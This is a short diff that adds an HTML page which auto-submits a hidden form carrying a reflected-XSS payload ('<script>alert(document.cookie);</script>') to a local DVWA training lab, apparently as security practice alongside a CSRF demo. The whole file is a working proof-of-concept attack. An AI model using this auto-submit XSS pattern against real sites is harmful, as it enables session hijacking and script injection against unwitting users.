@@ -1,0 +1,13 @@
+<html>
+<!--
+  like csrf.html but for (reflected) XSS
+-->
+<body>
+<form action="http://localhost/dvwa/vulnerabilities/xss_r/" method="GET">
+<input type="hidden" name="name" value="<script>alert(document.cookie);</script>">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
